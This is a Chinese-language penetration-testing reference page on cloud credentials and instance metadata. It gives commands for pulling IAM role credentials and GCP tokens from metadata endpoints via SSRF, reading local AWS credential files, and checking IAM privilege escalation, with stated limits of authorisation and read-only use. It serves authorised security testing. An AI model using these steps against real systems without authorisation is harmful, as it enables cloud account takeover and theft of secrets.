# 云凭据与元数据（cloud-credentials-metadata）

> 入口信号：拿到 AK/SK、CI 变量、实例角色、`169.254.169.254` 可达、或 S3/OSS 桶名。
> 目标：先证明“身份有效 + 权限面”，再决定是否取证；不把“有 key”写成“有管理员”。
> 配套：`references/cloud-native.md`、`scripts/adcloud-check.py`、`scripts/cloud-iam-eval.py`。

## 1. 先做一次低噪音身份校验

```bash
# AWS
aws sts get-caller-identity
aws configure list
# 只看身份/账号/ARN；不批量列资源
```

判据：返回 `Account`/`Arn`/`UserId`，且与本地凭据来源一致。
报 `AccessDenied`/`ExpiredToken`/`InvalidClientTokenId` = 凭据无效，记录后换来源。

## 2. 本地凭据面

```bash
python Tool/scripts/adcloud-check.py --aws-creds ~/.aws/credentials --json
```

脚本只做离线解析：AK 前缀、secret 是否硬编码、session token、profile、role_arn；
**不会**调用 STS/IAM/S3。输出里的 secret 只留指纹，不回传明文。

常见来源：

| 来源 | 路径 | 判据 |
| :-- | :-- | :-- |
| AWS CLI | `~/.aws/credentials`、`~/.aws/config` | 有 AK + secret；是否硬编码/是否 role |
| CI 变量 | GitLab/GitHub/Jenkins 环境 | token scope、是否可跨仓库/环境 |
| 容器/镜像层 | `.env`、`Dockerfile`、`dockerconfigjson` | 明文密钥 + 可实际登录/拉取 |
| 实例元数据 | `169.254.169.254` | IMDSv2 token + 角色临时凭据 + STS 成功 |
| K8s Secret | `kubectl get secret` | `dockerconfigjson`/SA token/云密钥可用 |

## 3. 元数据 SSRF 的顺序

```bash
# AWS IMDSv2：先拿 token，再取角色名，再取凭据
TOKEN=$(curl -s -X PUT 'http://169.254.169.254/latest/api/token' \
  -H 'X-aws-ec2-metadata-token-ttl-seconds: 60')
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  'http://169.254.169.254/latest/meta-data/iam/security-credentials/'
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  'http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>'
# GCP
curl -s -H 'Metadata-Flavor: Google' \
  'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token'
```

判据：拿到 `AccessKeyId`/`SecretAccessKey`/`Token` 后，`aws sts get-caller-identity` 成功。
失败判据：IMDSv2 强制但拿不到 token、端点 403/超时、角色无权限、SSRF 只能打内网。
输出只留 AK 指纹与 STS 返回，不落 secret/token 明文。

## 4. 权限面：文本 vs 实际

```bash
aws iam list-attached-user-policies --user-name <user>
aws iam list-user-policies --user-name <user>
aws iam get-policy-version --policy-arn <arn> --version-id <v>
# 只读；不要先 CreatePolicyVersion/PassRole
```

离线复算：

```bash
python Tool/skill/ad-cloud/scripts/cloud-iam-eval.py \
  --input policy.json --action iam:CreatePolicyVersion \
  --resource arn:aws:iam::123456789012:policy/demo
```

判据：`decision=allow` 只说明文本允许；还要看 boundary/SCP/资源策略，且实际 API 成功才算。
`decision=deny` 时显式 Deny 优先；`unknown` 表示条件无法离线求值。

## 5. 高价值动作（只读优先）

| 动作 | 能证明什么 | 注意 |
| :-- | :-- | :-- |
| `sts get-caller-identity` | 身份有效 | 最低噪音 |
| `iam list-*` / `get-policy-version` | 权限面 | 只读 |
| `s3 ls` / `head-object` | 可访问桶/对象 | 不批量导出 |
| `ec2 describe-instances --max-items 5` | 资源面 | 不启停 |
| `secretsmanager get-secret-value` | 凭据可用 | 高告警，需授权 |
| `iam CreatePolicyVersion` | 提权 | 高风险写，必须单独授权+备份 |

## 6. 失败判据

- STS 报 AccessDenied/ExpiredToken → 凭据无效，换来源。
- 元数据端点 403/超时/IMDSv2 拿不到 token → SSRF 到凭据路径 blocked。
- 策略文本 allow 但实际 API 拒绝 → 还有 boundary/SCP/资源策略，不能写“管理员”。
- 只有 `List*` 没有写权限 → 记录权限面，转数据取证或别的凭据。
- CI token 只读/环境隔离 → 不写“可跨仓库提权”。

## 7. 边界

- 只碰授权账号/订阅/项目/桶；不创建计费资源、不改 IAM、不批量导出数据。
- 不把 AK/SK/token 写进报告/仓库；只留指纹、来源、有效期。
- 云审计（CloudTrail/GuardDuty/Activity Log）会记录调用；控制频率与时间窗。
- Web 应用层 SSRF 的利用链属于 `web-pentest`；本页只接手“已拿到云凭据/元数据响应”。
